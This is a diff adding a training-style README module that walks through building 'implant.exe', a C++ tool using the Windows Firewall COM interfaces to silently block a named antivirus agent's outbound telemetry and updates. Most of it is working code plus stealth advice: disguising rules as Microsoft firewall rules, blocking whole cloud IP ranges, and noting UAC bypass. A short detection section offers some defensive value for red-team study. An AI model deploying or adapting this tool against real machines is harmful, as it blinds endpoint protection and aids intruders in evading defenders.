@@ -807,3 +807,429 @@ This module establishes the foundation for identifying security agent communicat
 
 
 </details>
+
+
+
+
+<details>
+<summary>03 - Blocking EPP Comms-Firewall</summary>
+
+## Overview
+
+This module demonstrates programmatic manipulation of Windows Firewall rules to block Endpoint Protection Platform (EPP) communications, effectively disrupting telemetry and update channels for security agents like antivirus, EDR, and Sysmon.
+
+## Technical Implementation
+
+### Step 1: Understanding Windows Firewall Architecture
+
+**Windows Firewall Profiles:**
+- **Domain Profile**: Applied when connected to corporate domain
+- **Private Profile**: Applied on trusted private networks  
+- **Public Profile**: Applied on untrusted public networks
+- **Target**: Outbound rules to block EPP agent communications
+
+**Firewall Rule Components:**
+- Application path targeting
+- Remote IP address blocking
+- Protocol and port restrictions
+- Rule naming and grouping for stealth
+
+### Step 2: Manual Firewall Configuration
+
+**Accessing Windows Firewall Settings:**
+1. Open Windows Defender Firewall
+2. Navigate to **Advanced Settings**
+3. Select **Outbound Rules**
+4. Observe existing rules and their configurations
+
+**Rule Creation Process:**
+- Create rules targeting specific security agent processes
+- Apply to all firewall profiles (Domain, Private, Public)
+- Use legitimate-sounding names and descriptions for stealth
+- Block outbound communications selectively
+
+### Step 3: Code Implementation
+
+#### Compile and Run the Demonstration
+
+Open **Developer Command Prompt for VS** with Administrator privileges:
+
+```batch
+cd 03.BlockingEPPComms-Firewall
+compile.bat
+implant.exe
+```
+
+#### Code Walkthrough
+
+**Step 3.1: COM Library Initialization**
+
+```cpp
+// Initialize COM library with apartment threading
+HRESULT hrComInit = CoInitializeEx(
+    0,
+    COINIT_APARTMENTTHREADED  // Required for firewall COM
+);
+
+if (FAILED(hrComInit)) {
+    printf("CoInitializeEx failed: 0x%08lx\n", hrComInit);
+    goto Cleanup;        
+}
+```
+
+**Threading Model:**
+- `COINIT_APARTMENTTHREADED` required for firewall COM objects
+- Different from previous modules using `COINIT_MULTITHREADED`
+- Essential for proper firewall COM object operation
+
+**Step 3.2: Firewall Policy Object Creation**
+
+```cpp
+// Load NetFwPolicy2 COM object
+INetFwPolicy2 *pNetFwPolicy2 = NULL;	
+hr = CoCreateInstance(
+    __uuidof(NetFwPolicy2),      // Firewall policy class ID
+    NULL, 
+    CLSCTX_INPROC_SERVER, 
+    __uuidof(INetFwPolicy2),     // Interface ID
+    (LPVOID *) &pNetFwPolicy2
+);
+
+if (FAILED(hr)) {
+    printf("CoCreateInstance for INetFwPolicy2 failed: 0x%08lx\n", hr);
+    goto Cleanup;        
+}
+```
+
+**Firewall COM Components:**
+- `NetFwPolicy2` - Main firewall policy management interface
+- Provides access to firewall rules collection
+- Requires administrator privileges for modification
+
+**Step 3.3: Accessing Firewall Rules Collection**
+
+```cpp
+// Retrieve FW rules collection
+INetFwRules *pFwRules = NULL;
+hr = pNetFwPolicy2->get_Rules(&pFwRules);
+if (FAILED(hr)) {
+    printf("get_Rules failed: 0x%08lx\n", hr);
+    goto Cleanup;
+}
+```
+
+**Rules Collection:**
+- `INetFwRules` interface manages all firewall rules
+- Provides `Add`, `Remove`, and `Item` methods
+- Contains both inbound and outbound rules
+
+**Step 3.4: Creating New Firewall Rule Object**
+
+```cpp
+// Create a new Firewall Rule object
+INetFwRule *pFwRule = NULL;
+hr = CoCreateInstance(
+    __uuidof(NetFwRule),         // Firewall rule class ID
+    NULL,
+    CLSCTX_INPROC_SERVER,
+    __uuidof(INetFwRule),        // Rule interface ID
+    (void**)&pFwRule
+);
+
+if (FAILED(hr)) {
+    printf("CoCreateInstance for Firewall Rule failed: 0x%08lx\n", hr);
+    goto Cleanup;
+}
+```
+
+**Rule Object Creation:**
+- `NetFwRule` represents individual firewall rules
+- Configurable with various properties and conditions
+- Must be fully configured before adding to rules collection
+
+**Step 3.5: Configuring Rule Properties**
+
+```cpp
+// New FW rule settings with legitimate-looking names
+BSTR bstrRuleName = SysAllocString(L"Windows Defender Firewall Remote Management (RPC)");
+BSTR bstrRuleGroup = SysAllocString(L"Windows Defender Firewall Remote Management (RPC)");
+BSTR bstrRuleDescription = SysAllocString(L"Deny malicious outbound network traffic");
+BSTR bstrRuleApplication = SysAllocString(L"C:\\Program Files\\Bitdefender Antivirus Free\\vsserv.exe");
+BSTR bstrRuleRAddrs = SysAllocString(L"54.0.0.0/8");
+
+// Apply to all firewall profiles
+long CurrentProfilesBitMask = NET_FW_PROFILE2_DOMAIN | 
+                              NET_FW_PROFILE2_PRIVATE | 
+                              NET_FW_PROFILE2_PUBLIC;
+```
+
+**Stealth Configuration:**
+- Use names that blend with existing Windows rules
+- "Windows Defender Firewall Remote Management" appears legitimate
+- Descriptions should not raise suspicion
+- Grouping helps organize related rules
+
+**Step 3.6: Setting Rule Parameters**
+
+```cpp
+// Populate the Firewall Rule object
+pFwRule->put_Name(bstrRuleName);
+pFwRule->put_Description(bstrRuleDescription);
+pFwRule->put_ApplicationName(bstrRuleApplication);
+pFwRule->put_Protocol(NET_FW_IP_PROTOCOL_ANY);
+// pFwRule->put_RemoteAddresses(bstrRuleRAddrs);  // Optional IP blocking
+pFwRule->put_Direction(NET_FW_RULE_DIR_OUT);      // Outbound rule
+pFwRule->put_Grouping(bstrRuleGroup);
+pFwRule->put_Profiles(CurrentProfilesBitMask);    // All profiles
+pFwRule->put_Action(NET_FW_ACTION_BLOCK);         // Block traffic
+pFwRule->put_Enabled(VARIANT_TRUE);               // Enable immediately
+```
+
+**Key Rule Properties:**
+- `ApplicationName`: Target specific executable path
+- `Direction`: `NET_FW_RULE_DIR_OUT` for outbound blocking
+- `Action`: `NET_FW_ACTION_BLOCK` to prevent communications
+- `Profiles`: Apply to all network types
+- `Enabled`: `VARIANT_TRUE` to activate immediately
+
+**Step 3.7: Adding Rule to Firewall**
+
+```cpp
+// Add the Firewall Rule to the collection
+hr = pFwRules->Add(pFwRule);
+if (FAILED(hr)) {
+    printf("Firewall Rule Add failed: 0x%08lx\n", hr);
+    goto Cleanup;
+}
+```
+
+**Rule Activation:**
+- Rules take effect immediately upon addition
+- No service restart required
+- Existing connections may be terminated
+- New connection attempts are blocked
+
+**Step 3.8: Comprehensive Cleanup**
+
+```cpp
+Cleanup:
+    // Free BSTR strings
+    SysFreeString(bstrRuleName);
+    SysFreeString(bstrRuleDescription);
+    SysFreeString(bstrRuleGroup);
+    SysFreeString(bstrRuleApplication);
+    SysFreeString(bstrRuleRAddrs);
+
+    // Release COM objects in reverse creation order
+    if (pFwRule != NULL) pFwRule->Release();
+    if (pFwRules != NULL) pFwRules->Release();
+    if (pNetFwPolicy2 != NULL) pNetFwPolicy2->Release();
+
+    // Uninitialize COM
+    if (SUCCEEDED(hrComInit)) {
+        CoUninitialize();
+    }
+```
+
+**Proper Resource Management:**
+- Always free BSTR strings to prevent memory leaks
+- Release COM objects in reverse creation order
+- Proper cleanup ensures system stability
+
+## Practical Demonstration
+
+### Step 4: Running the Implant
+
+**Execute with Administrator Privileges:**
+```batch
+implant.exe
+```
+
+**Expected Output:**
+- No console output on success (silent operation)
+- Immediate termination of target process connections
+- New firewall rule visible in Windows Firewall
+
+### Step 5: Verification and Observation
+
+**Check Firewall Rules:**
+1. Open **Windows Defender Firewall with Advanced Security**
+2. Navigate to **Outbound Rules**
+3. Look for rule named "Windows Defender Firewall Remote Management (RPC)"
+4. Verify rule is enabled and blocking outbound traffic
+
+**Rule Properties Verification:**
+- **Name**: Windows Defender Firewall Remote Management (RPC)
+- **Group**: Windows Defender Firewall Remote Management (RPC)  
+- **Action**: Block
+- **Program**: C:\Program Files\Bitdefender Antivirus Free\vsserv.exe
+- **Protocol**: Any
+- **Direction**: Out
+- **Profiles**: Domain, Private, Public
+
+**Network Connection Observation:**
+- Previously established Bitdefender connections immediately terminated
+- New connection attempts from target process fail
+- Process continues running but cannot communicate externally
+
+### Step 6: Advanced IP-Based Blocking
+
+**Uncomment Remote Address Blocking:**
+```cpp
+// Enable IP-based blocking in addition to application blocking
+pFwRule->put_RemoteAddresses(bstrRuleRAddrs);  // "54.0.0.0/8"
+```
+
+**IP Blocking Strategy:**
+- Block entire IP ranges used by security providers
+- Use CIDR notation for network blocks
+- Combine with application blocking for comprehensive coverage
+- Multiple rules can target different IP ranges
+
+**Multiple Rule Creation:**
+```cpp
+// Create multiple rules for different IP ranges
+BSTR bstrRuleRAddrs1 = SysAllocString(L"18.0.0.0/8");
+BSTR bstrRuleRAddrs2 = SysAllocString(L"54.0.0.0/8");
+BSTR bstrRuleRAddrs3 = SysAllocString(L"52.0.0.0/8");
+
+// Create separate rules for each IP range
+// Each rule blocks the target application to specific IP ranges
+```
+
+## Technical Deep Dive
+
+### Step 7: Firewall Rule Priority and Evaluation
+
+**Rule Processing Order:**
+1. Windows evaluates rules from most specific to least specific
+2. Application-specific rules take precedence over general rules
+3. First matching rule determines the action
+4. Default action (allow/block) applies if no rules match
+
+**Rule Specificity:**
+- Application + Remote IP: Most specific
+- Application only: Medium specificity  
+- Remote IP only: Less specific
+- General rules: Least specific
+
+### Step 8: Stealth Considerations
+
+**Rule Naming Strategies:**
+```cpp
+// Legitimate-sounding rule names
+BSTR bstrRuleName = SysAllocString(L"Windows Defender Advanced Threat Protection");
+BSTR bstrRuleName = SysAllocString(L"Microsoft Security Client Network Inspection");
+BSTR bstrRuleName = SysAllocString(L"System Guard Runtime Monitor Broker");
+```
+
+**Grouping for Organization:**
+- Use existing group names when possible
+- Create groups that appear to be system components
+- Avoid suspicious or custom group names
+
+### Step 9: Error Handling and Reliability
+
+**Enhanced Error Checking:**
+```cpp
+// Check if rule already exists before adding
+HRESULT hrAdd = pFwRules->Add(pFwRule);
+if (hrAdd == FWP_E_ALREADY_EXISTS) {
+    printf("Firewall rule already exists\n");
+    // Handle duplicate rule scenario
+} else if (FAILED(hrAdd)) {
+    printf("Firewall Rule Add failed: 0x%08lx\n", hrAdd);
+    goto Cleanup;
+}
+```
+
+**Rule Existence Verification:**
+```cpp
+// Verify rule was added successfully
+INetFwRule *pVerifiedRule = NULL;
+HRESULT hrGet = pFwRules->Item(bstrRuleName, &pVerifiedRule);
+if (SUCCEEDED(hrGet)) {
+    printf("Rule successfully added and verified\n");
+    pVerifiedRule->Release();
+}
+```
+
+## Detection and Mitigation
+
+### Detection Opportunities
+
+**Behavioral Indicators:**
+- Programmatic firewall rule creation
+- Rules blocking security agent communications
+- Multiple rules targeting same application with different IP ranges
+- Rules with suspicious names or descriptions
+
+**Forensic Artifacts:**
+- Windows Firewall event logs (Event ID 2004, 2005, 2006)
+- COM activation events for firewall interfaces
+- Rule creation timestamps in firewall configuration
+
+### Defensive Strategies
+
+**Firewall Monitoring:**
+```cpp
+// EDRs can monitor for suspicious firewall rule creation
+BOOL MonitorFirewallRules() {
+    // Track rule creation patterns
+    // Alert on rules blocking security processes
+    // Monitor for rules with suspicious names
+    return IsSuspiciousFirewallActivity();
+}
+```
+
+**Rule Integrity Checking:**
+- Regular scanning of firewall rules
+- Baseline comparison of rule sets
+- Alerting on rules that block security services
+
+## Building the Project
+
+### Prerequisites
+- Visual Studio 2019 or later
+- Windows SDK
+- Administrator privileges for testing
+
+### Compilation
+```batch
+cd 03.BlockingEPPComms-Firewall
+compile.bat
+```
+
+### Required Libraries and Headers
+```cpp
+#include <windows.h>
+#include <stdio.h>
+#include <netfw.h>  // Windows Firewall interfaces
+
+#pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "oleaut32.lib")
+```
+
+## Operational Considerations
+
+### Privilege Requirements
+- **Local Administrator**: Required for firewall rule modification
+- **No SYSTEM Required**: Standard admin privileges sufficient
+- **UAC Bypass**: May be needed in some environments
+
+### Persistence and Maintenance
+- Firewall rules persist across reboots
+- Rules remain active until explicitly removed
+- Multiple rules can be created for comprehensive blocking
+- Rules should be cleaned up after operation completion
+
+## References
+
+- Microsoft Docs: Windows Firewall with Advanced Security
+- MSDN: INetFwPolicy2 Interface
+- MSDN: INetFwRule Interface
+- MITRE ATT&CK: T1562.004 (Impair Defenses: Disable or Modify System Firewall)
+
+
+      
+</details>
